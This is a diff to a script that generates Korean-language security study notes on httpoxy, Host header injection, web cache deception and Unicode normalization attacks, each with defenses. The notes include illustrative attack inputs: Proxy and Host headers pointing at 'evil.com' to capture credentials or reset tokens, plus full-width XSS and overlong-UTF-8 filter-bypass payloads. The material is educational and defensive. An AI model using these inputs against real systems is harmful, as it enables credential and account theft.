@@ -1056,3 +1056,448 @@ for fname, content in FILES.items():
 commit("feat: Security #485-488 ZAP/Burp/SQLMap/Nikto")
 FILES.clear()
 print("Batch 485-488 done")
+
+FILES["489_httpoxy.md"] = """\
++++
+weight = 489
+title = "489. httpoxy (HTTP Proxy 환경 변수 취약점)"
+date = "2026-04-21"
+[extra]
+categories = "studynote-security"
++++
+
+## 핵심 인사이트 (3줄 요약)
+> 1. **본질**: httpoxy는 CGI (Common Gateway Interface) 환경에서 HTTP 요청의 `Proxy` 헤더가 `HTTP_PROXY` 환경 변수로 변환되어 서버 사이드 HTTP 클라이언트의 프록시 설정을 공격자가 제어할 수 있게 되는 취약점이다.
+> 2. **가치**: Go·PHP·Python 등 다양한 언어의 HTTP 클라이언트 라이브러리가 영향을 받았으며, 서버가 내부 API 호출 시 공격자 프록시를 경유하게 되어 자격증명이 탈취될 수 있다.
+> 3. **판단 포인트**: CGI 환경에서 `Proxy` 요청 헤더를 제거하는 웹 서버/리버스 프록시 설정이 핵심 방어이다.
+
+---
+
+## Ⅰ. 개요 및 필요성
+
+httpoxy는 2016년 7월에 공개된 취약점(CVE-2016-5385 등)으로, CGI RFC 3875에 따르면 HTTP 요청 헤더 `Foo-Bar`는 환경 변수 `HTTP_FOO_BAR`로 변환된다. 따라서 `Proxy: http://attacker.com` 헤더는 `HTTP_PROXY` 환경 변수로 변환되어, 많은 HTTP 클라이언트 라이브러리가 이를 프록시 주소로 사용한다.
+
+영향 언어: PHP (curl, file_get_contents), Python (requests, urllib), Go (net/http), Ruby, Java 일부 라이브러리.
+
+📢 **섹션 요약 비유**: 편지(HTTP 요청)에 "이 편지를 A를 통해 전달하라"는 쪽지(Proxy 헤더)를 끼워 넣으면 서버가 그 지시를 따르는 것이다.
+
+---
+
+## Ⅱ. 아키텍처 및 핵심 원리
+
+| 단계 | 내용 |
+|:---|:---|
+| 1. 공격 | 요청 헤더 `Proxy: http://evil.com:8080` |
+| 2. CGI 변환 | `HTTP_PROXY=http://evil.com:8080` 환경 변수 |
+| 3. 라이브러리 읽기 | HTTP 클라이언트가 환경 변수로 프록시 설정 |
+| 4. 트래픽 경유 | 서버→내부API 요청이 공격자 프록시 경유 |
+| 5. 탈취 | 내부 API 자격증명·응답 탈취 |
+
+```
+[httpoxy 공격 흐름]
+
+공격자
+  │ GET /page HTTP/1.1
+  │ Proxy: http://evil.com:8080
+  ▼
+CGI 웹 서버
+  │ 환경 변수 설정
+  │ HTTP_PROXY=http://evil.com:8080
+  ▼
+PHP/Python 스크립트
+  │ file_get_contents("http://internal-api/secret")
+  │ (HTTP_PROXY 환경 변수 사용)
+  ▼
+evil.com:8080 (공격자 프록시)
+  │ 내부 API 자격증명 수신
+  ▼
+내부 API 서버
+```
+
+📢 **섹션 요약 비유**: 우편함(환경 변수)에 쪽지를 넣어 우체부(HTTP 클라이언트)의 배달 경로를 바꾸는 것이다.
+
+---
+
+## Ⅲ. 비교 및 연결
+
+| 취약 환경 | 안전 환경 |
+|:---|:---|
+| CGI 스크립트 | FastCGI, WSGI |
+| PHP + Apache mod_cgi | PHP-FPM |
+| Python CGI | Gunicorn/uWSGI |
+
+FastCGI나 WSGI 환경에서는 HTTP 헤더가 환경 변수로 자동 변환되지 않으므로 httpoxy에 취약하지 않다.
+
+📢 **섹션 요약 비유**: 구형 우편 시스템(CGI)은 쪽지 조작에 취약하지만, 현대 택배 시스템(FastCGI)은 안전하다.
+
+---
+
+## Ⅳ. 실무 적용 및 기술사 판단
+
+**방어 조치**:
+1. Nginx: `proxy_set_header Proxy "";`
+2. Apache: `RequestHeader unset Proxy`
+3. CGI 대신 FastCGI/WSGI 사용
+4. 애플리케이션 레벨: `HTTP_PROXY` 환경 변수 무시 설정
+
+**패치 현황**: PHP 5.5.38+, 5.6.24+, 7.0.9+ 에서 `HTTP_PROXY` 환경 변수 처리 방식 수정 완료.
+
+�� **섹션 요약 비유**: 우편함(헤더)을 검열해서 나쁜 쪽지(Proxy 헤더)를 버리면 경로 조작이 불가능해진다.
+
+---
+
+## Ⅴ. 기대효과 및 결론
+
+httpoxy 방어를 적용하면 서버 사이드 내부 API 트래픽 탈취 공격을 차단할 수 있다. 현대 아키텍처에서 CGI 대신 FastCGI/WSGI로 마이그레이션하는 것이 근본적인 해결책이다.
+
+📢 **섹션 요약 비유**: 구형 우편 시스템에서 현대 택배로 바꾸면 쪽지 조작 자체가 불가능해진다.
+
+---
+
+### 📌 관련 개념 맵
+| 개념 | 관계 | 설명 |
+|:---|:---|:---|
+| CGI | 취약 환경 | 헤더→환경 변수 자동 변환 |
+| HTTP_PROXY | 취약 변수 | 프록시 설정 환경 변수 |
+| FastCGI | 안전 대안 | 환경 변수 자동 변환 없음 |
+| CVE-2016-5385 | 취약점 ID | PHP httpoxy 취약점 |
+
+### 👶 어린이를 위한 3줄 비유 설명
+httpoxy는 편지(요청)에 "이 길로 가세요"라는 쪽지(Proxy 헤더)를 넣으면 우체부(서버)가 그 길을 따라가는 취약점이에요.
+그 길이 나쁜 사람의 집(공격자 프록시)을 경유하면 비밀 내용이 탈취돼요.
+우편함(헤더)에서 그 쪽지를 미리 버리면(헤더 제거) 이 공격을 막을 수 있어요.
+"""
+
+FILES["490_host_header_injection_url.md"] = """\
++++
+weight = 490
+title = "490. Host Header Injection URL (호스트 헤더 인젝션 URL 기반)"
+date = "2026-04-21"
+[extra]
+categories = "studynote-security"
++++
+
+## 핵심 인사이트 (3줄 요약)
+> 1. **본질**: Host Header Injection은 HTTP (Hypertext Transfer Protocol) 요청의 `Host` 헤더를 조작하여 서버가 이를 신뢰하고 비밀번호 재설정 링크·이메일 URL·캐시 Key 등에 사용할 때 공격자 도메인으로 유도하는 공격이다.
+> 2. **가치**: 비밀번호 재설정 링크가 공격자 도메인으로 생성되면 피해자 계정을 완전히 탈취할 수 있으며, 웹 캐시 포이즈닝(Web Cache Poisoning)과 결합 시 대규모 피해가 가능하다.
+> 3. **판단 포인트**: 서버가 `Host` 헤더 값을 검증 없이 URL 생성에 사용하는지 여부가 취약점의 핵심이다.
+
+---
+
+## Ⅰ. 개요 및 필요성
+
+모든 HTTP/1.1 요청에는 필수적으로 `Host` 헤더가 포함된다. 가상 호스팅(Virtual Hosting) 환경에서 웹 서버는 이 헤더를 사용해 어떤 사이트에 대한 요청인지 구분한다. 문제는 일부 애플리케이션이 `Host` 헤더 값을 절대 URL 생성, 이메일 링크, CSRF (Cross-Site Request Forgery) 토큰 검증, HTTP 리다이렉션에 직접 사용한다는 것이다.
+
+📢 **섹션 요약 비유**: 집 주소(Host 헤더)를 가짜로 바꿔서 우편물(비밀번호 재설정 링크)이 내 집으로 배달되게 하는 것이다.
+
+---
+
+## Ⅱ. 아키텍처 및 핵심 원리
+
+| 공격 시나리오 | 취약 코드 | 결과 |
+|:---|:---|:---|
+| 비밀번호 재설정 | `reset_link = "http://" + request.headers['Host'] + "/reset?token=..."` | 공격자 도메인 링크 생성 |
+| 웹 캐시 포이즈닝 | Host 헤더를 Cache Key에 포함 | 독성 캐시 생성 |
+| 오픈 리다이렉트 | `return redirect("http://" + host + path)` | 피싱 리다이렉트 |
+
+```
+[비밀번호 재설정 공격 흐름]
+
+공격자
+  │ POST /forgot-password
+  │ Host: evil.com
+  │ body: email=victim@example.com
+  ▼
+취약 서버
+  │ reset_link = "http://evil.com/reset?token=abc123"
+  │ send_email(victim@example.com, reset_link)
+  ▼
+피해자 이메일
+  │ "비밀번호 재설정: http://evil.com/reset?token=abc123"
+  ▼
+피해자 클릭
+  │ evil.com에 토큰 전송
+  ▼
+공격자
+  토큰으로 피해자 계정 탈취
+```
+
+📢 **섹션 요약 비유**: 우편함 주소표지(Host 헤더)를 나쁜 사람 주소로 바꾸면 비밀 편지(토큰)가 그쪽으로 배달된다.
+
+---
+
+## Ⅲ. 비교 및 연결
+
+| 변형 | 추가 헤더 | 우회 가능성 |
+|:---|:---|:---|
+| 기본 | `Host: evil.com` | 방어 쉬움 |
+| X-Forwarded-Host | `X-Forwarded-Host: evil.com` | 리버스 프록시 신뢰 취약 |
+| X-Host | `X-Host: evil.com` | 일부 프레임워크 취약 |
+| 이중 Host | `Host: real.com\r\nHost: evil.com` | 파서 취약점 |
+
+📢 **섹션 요약 비유**: 정문(Host)이 잠겨 있으면 옆문(X-Forwarded-Host)을 사용하는 것이다.
+
+---
+
+## Ⅳ. 실무 적용 및 기술사 판단
+
+**방어**:
+1. 서버에 허용 호스트 화이트리스트 설정 (Django `ALLOWED_HOSTS`, Rails `config.hosts`)
+2. URL 생성 시 `Host` 헤더 대신 환경 설정에서 도메인 읽기
+3. X-Forwarded-Host를 신뢰하는 경우 리버스 프록시 레벨에서 검증
+
+📢 **섹션 요약 비유**: 허가받은 주소(화이트리스트)만 사용해서 가짜 주소가 들어오지 못하게 한다.
+
+---
+
+## Ⅴ. 기대효과 및 결론
+
+허용 호스트 화이트리스트 설정과 환경 설정 기반 URL 생성으로 Host Header Injection을 완전히 차단할 수 있다. 비밀번호 재설정 기능의 URL 생성 로직 검토는 보안 코드 리뷰의 필수 항목이다.
+
+📢 **섹션 요약 비유**: 우편물 주소를 사전에 등록된 주소(화이트리스트)로만 허용하면 가짜 배달이 사라진다.
+
+---
+
+### 📌 관련 개념 맵
+| 개념 | 관계 | 설명 |
+|:---|:---|:---|
+| 비밀번호 재설정 | 공격 시나리오 | Host 조작으로 링크 탈취 |
+| 웹 캐시 포이즈닝 | 연계 공격 | Host 기반 Cache Key 조작 |
+| ALLOWED_HOSTS | 방어 | Django 화이트리스트 설정 |
+| X-Forwarded-Host | 변형 | 리버스 프록시 경유 우회 |
+
+### 👶 어린이를 위한 3줄 비유 설명
+Host Header Injection은 배달 주소(Host 헤더)를 가짜로 써서 비밀 편지(토큰)가 나쁜 사람에게 가게 하는 공격이에요.
+서버가 주소를 믿고 그대로 편지를 보내버리면 피해자 계정이 탈취돼요.
+미리 올바른 주소 목록(ALLOWED_HOSTS)을 만들어두면 가짜 주소를 거부할 수 있어요.
+"""
+
+FILES["491_web_cache_deception.md"] = """\
++++
+weight = 491
+title = "491. Web Cache Deception (웹 캐시 기만 공격)"
+date = "2026-04-21"
+[extra]
+categories = "studynote-security"
++++
+
+## 핵심 인사이트 (3줄 요약)
+> 1. **본질**: Web Cache Deception은 캐시 서버와 애플리케이션 서버의 URL 경로 해석 불일치를 이용해 인증된 사용자의 개인 응답(프로필·계정 페이지)을 공개 캐시에 저장하게 만드는 공격이다.
+> 2. **가치**: 공격자가 피해자를 악성 URL로 유도하면 피해자의 세션 토큰·개인 정보가 캐시에 저장되어 공격자가 직접 접근할 수 있게 된다.
+> 3. **판단 포인트**: 캐시 서버가 URL 확장자(`.jpg`, `.css`)를 기반으로 캐시 여부를 결정하고, 애플리케이션이 마지막 경로 세그먼트를 무시할 때 취약하다.
+
+---
+
+## Ⅰ. 개요 및 필요성
+
+2017년 Omer Gil이 발표한 Web Cache Deception 공격은 CDN (Content Delivery Network)·Varnish·Nginx 등의 역방향 캐시와 애플리케이션 서버의 URL 처리 방식 차이를 악용한다.
+
+시나리오: `/profile/photo.jpg` 요청 시 CDN은 `.jpg` 확장자를 보고 캐시해야 할 정적 파일로 판단하지만, 애플리케이션은 `/profile`로만 라우팅해 인증된 사용자의 프로필 HTML을 반환한다. CDN은 이 개인 응답을 퍼블릭 캐시에 저장한다.
+
+📢 **섹션 요약 비유**: 도서관원(CDN)이 책 표지(URL 확장자)만 보고 분류하는데, 표지를 위조해서 비밀 일기(개인 응답)를 공개 서가에 꽂아두게 하는 것이다.
+
+---
+
+## Ⅱ. 아키텍처 및 핵심 원리
+
+| 단계 | URL | CDN 판단 | App 응답 |
+|:---|:---|:---|:---|
+| 1. 공격자 URL 생성 | `/account/info.jpg` | 캐시 가능(.jpg) | 인증 필요 |
+| 2. 피해자 방문 | 동일 URL | 캐시 저장 | 계정 정보 HTML |
+| 3. 공격자 접근 | 동일 URL | 캐시에서 제공 | 피해자 계정 정보 |
+
+```
+[Web Cache Deception 흐름]
+
+공격자: https://site.com/account/evil.jpg 링크 생성
+  │
+피해자 (로그인 상태) 클릭
+  │ GET /account/evil.jpg
+  ▼
+CDN
+  │ ".jpg" → 캐시 가능 판단
+  │ 캐시 미스 → 앱 서버 요청
+  ▼
+앱 서버
+  │ /account/evil.jpg → /account 라우팅
+  │ 피해자 인증 세션 확인
+  │ 계정 정보 HTML 반환
+  ▼
+CDN
+  │ 200 OK + 계정 정보 → 퍼블릭 캐시 저장
+  ▼
+공격자
+  │ GET /account/evil.jpg
+  ▼
+CDN
+  캐시 히트 → 피해자 계정 정보 제공
+```
+
+📢 **섹션 요약 비유**: 비밀 일기(계정 정보) 표지를 잡지(evil.jpg)로 위장해서 도서관(CDN) 공개 서가에 꽂아두게 하는 것이다.
+
+---
+
+## Ⅲ. 비교 및 연결
+
+| 항목 | Web Cache Deception | Web Cache Poisoning |
+|:---|:---|:---|
+| 목적 | 개인 응답 캐시 노출 | 악성 응답 캐시 주입 |
+| 피해 | 개인 정보 유출 | 다수 사용자 공격 |
+| 조건 | 앱 경로 무시 + 캐시 확장자 판단 | 캐시 Key 조작 가능 |
+
+📢 **섹션 요약 비유**: 기만은 내 일기가 공개되는 것, 포이즈닝은 모두의 책에 독이 주입되는 것이다.
+
+---
+
+## Ⅳ. 실무 적용 및 기술사 판단
+
+**방어**:
+1. 캐시 서버에 `Cache-Control: no-store` 헤더가 없는 인증 응답은 캐시하지 않도록 설정
+2. URL 확장자 기반 캐시 결정 금지 → `Cache-Control` 헤더 기반 캐시 정책 적용
+3. 알 수 없는 URL 세그먼트에 대해 애플리케이션이 404를 반환하도록 구성
+
+📢 **섹션 요약 비유**: 도서관원(CDN)이 표지(확장자)가 아닌 저자 허가증(`Cache-Control`)을 보고 분류하면 위조가 통하지 않는다.
+
+---
+
+## Ⅴ. 기대효과 및 결론
+
+`Cache-Control: no-store` 헤더를 인증 응답에 일관되게 적용하면 Web Cache Deception 공격이 원천적으로 차단된다. CDN 캐시 정책을 URL 확장자 기반에서 응답 헤더 기반으로 전환하는 것이 장기적 방어 전략이다.
+
+📢 **섹션 요약 비유**: 도서관 분류 기준(캐시 정책)을 표지에서 내용(응답 헤더)으로 바꾸면 위조 표지가 소용없어진다.
+
+---
+
+### 📌 관련 개념 맵
+| 개념 | 관계 | 설명 |
+|:---|:---|:---|
+| CDN | 공격 매개 | 잘못된 캐시 저장소 |
+| Cache-Control | 방어 | 캐시 정책 헤더 |
+| 웹 캐시 포이즈닝 | 관련 공격 | 캐시 Key 조작으로 악성 응답 주입 |
+| URL 라우팅 불일치 | 근본 원인 | CDN과 앱 서버 URL 해석 차이 |
+
+### 👶 어린이를 위한 3줄 비유 설명
+Web Cache Deception은 비밀 일기를 잡지 표지로 위장해서 도서관 공개 서가에 올려두는 공격이에요.
+도서관원(CDN)이 표지(URL 확장자)만 보고 분류하기 때문에 속아요.
+"이 책은 공개 불가"(Cache-Control: no-store) 표시를 붙여두면 막을 수 있어요.
+"""
+
+FILES["492_unicode_normalization_attack.md"] = """\
++++
+weight = 492
+title = "492. Unicode Normalization 공격 (유니코드 정규화 공격)"
+date = "2026-04-21"
+[extra]
+categories = "studynote-security"
++++
+
+## 핵심 인사이트 (3줄 요약)
+> 1. **본질**: Unicode Normalization 공격은 유니코드 정규화(NFC, NFD, NFKC, NFKD) 과정에서 시각적으로 동일해 보이는 문자가 실제로 다른 코드포인트를 가져 보안 필터를 우회하거나 경로 조작에 활용되는 취약점이다.
+> 2. **가치**: 입력 검증 후 정규화가 수행되면 검증을 통과한 입력이 나중에 위험한 문자로 변환될 수 있어, 검증 순서가 잘못된 경우 XSS·경로 순회·SQLi 필터 우회에 활용된다.
+> 3. **판단 포인트**: 입력 검증은 반드시 정규화(Normalization) 후에 수행해야 하며, 인코딩 계층이 다른 서버(Gateway-Backend 간)에서 정규화 방식이 다를 때 취약점이 발생한다.
+
+---
+
+## Ⅰ. 개요 및 필요성
+
+Unicode (유니코드)는 전 세계 문자를 단일 코드 체계로 표현하는 국제 표준이다. 동일한 문자가 여러 코드포인트로 표현될 수 있어 정규화(Normalization)가 필요하다.
+
+예시:
+- `é` = U+00E9 (합성형, NFC)
+- `é` = U+0065 + U+0301 (분해형, NFD)
+- `ﬁ` = U+FB01 (합자) → NFC 정규화 후 `fi`
+
+이 차이를 이용해 WAF (Web Application Firewall) 필터가 탐지하지 못하는 페이로드를 구성하거나, 정규화 후 경로가 변경되는 점을 악용한다.
+
+📢 **섹션 요약 비유**: 같은 글자지만 다른 부품(코드포인트)으로 만들어진 가짜 열쇠(페이로드)로 자물쇠(필터)를 여는 것이다.
+
+---
+
+## Ⅱ. 아키텍처 및 핵심 원리
+
+| 정규화 형식 | 설명 | 공격 가능성 |
+|:---|:---|:---|
+| NFC | 합성 정규화 | 필터 우회 |
+| NFD | 분해 정규화 | 경로 우회 |
+| NFKC | 호환 합성 | Full-width 문자 변환 |
+| NFKD | 호환 분해 | 특수문자 표준화 |
+
+```
+[Unicode 정규화 공격 예시]
+
+WAF 필터: "<script>"  탐지
+공격자 입력: "＜script＞"  (Full-width < >)
+           U+FF1C, U+FF1E
+
+  │ WAF 검사: 탐지 안 됨 (< > 아님)
+  ▼
+  웹 서버 NFKC 정규화
+  ＜ → <  ＞ → >
+  │
+  ▼
+  "<script>" 생성 → XSS 실행
+```
+
+📢 **섹션 요약 비유**: 외관이 비슷한 가짜 쌍둥이(Full-width 문자)가 문지기(WAF) 검문을 통과한 뒤 진짜 위험한 사람으로 변신하는 것이다.
+
+---
+
+## Ⅲ. 비교 및 연결
+
+| 공격 유형 | 유니코드 활용 | 결과 |
+|:---|:---|:---|
+| XSS 필터 우회 | Full-width 태그 | 정규화 후 스크립트 실행 |
+| 경로 순회 | `%c0%af` (overlong UTF-8) | `../` 생성 |
+| 파일 업로드 | `.ph%C0%B0` | `.php` 변환 |
+| IDN 호모그래프 | `аpple.com` (키릴 а) | 피싱 도메인 |
+
+📢 **섹션 요약 비유**: 변장 전문가(유니코드 문자)가 검문소(WAF) 통과 후 원래 모습(위험 문자)으로 돌아오는 것이다.
+
+---
+
+## Ⅳ. 실무 적용 및 기술사 판단
+
+**방어 원칙**:
+1. **정규화 먼저, 검증 나중**: 입력을 NFC/NFKC로 정규화한 후 검증
+2. 서버 간 인코딩 일관성 유지
+3. IDN (Internationalized Domain Names) 도메인 검증 강화
+
+**Python 방어 코드**:
+```python
+import unicodedata
+normalized = unicodedata.normalize('NFKC', user_input)
+# 검증은 normalized에 대해 수행
+```
+
+📢 **섹션 요약 비유**: 검문 전에 변장을 벗겨(정규화)야 진짜 얼굴(위험 문자)을 확인할 수 있다.
+
+---
+
+## Ⅴ. 기대효과 및 결론
+
+입력 정규화를 검증 전에 수행하고 서버 간 인코딩을 통일하면 유니코드 기반 필터 우회 공격을 대부분 차단할 수 있다. 특히 다국어 지원 애플리케이션에서 이 원칙은 필수적이다.
+
+📢 **섹션 요약 비유**: 변장을 먼저 벗긴 후 검문하면 어떤 위장도 통하지 않는다.
+
+---
+
+### 📌 관련 개념 맵
+| 개념 | 관계 | 설명 |
+|:---|:---|:---|
+| NFKC | 정규화 형식 | 호환 문자 표준화 |
+| Full-width 문자 | 공격 도구 | WAF 필터 우회용 |
+| IDN 호모그래프 | 관련 공격 | 유사 문자 피싱 도메인 |
+| Overlong UTF-8 | 공격 기법 | 경로 순회에 활용 |
+
+### 👶 어린이를 위한 3줄 비유 설명
+유니코드 공격은 똑같이 생긴 가짜 문자(Full-width)를 써서 경비원(WAF)의 눈을 속이는 거예요.
+경비원을 통과하면 서버가 진짜 위험한 문자로 바꿔버려요.
+검문 전에 모든 문자를 통일된 형태(정규화)로 바꾸면 가짜가 통하지 않아요.
+"""
+
+# Commit batch 489-492
+for fname, content in FILES.items():
+    w(fname, content)
+commit("feat: Security #489-492 httpoxy/HostHeader/CacheDeception/Unicode")
+FILES.clear()
+print("Batch 489-492 done")
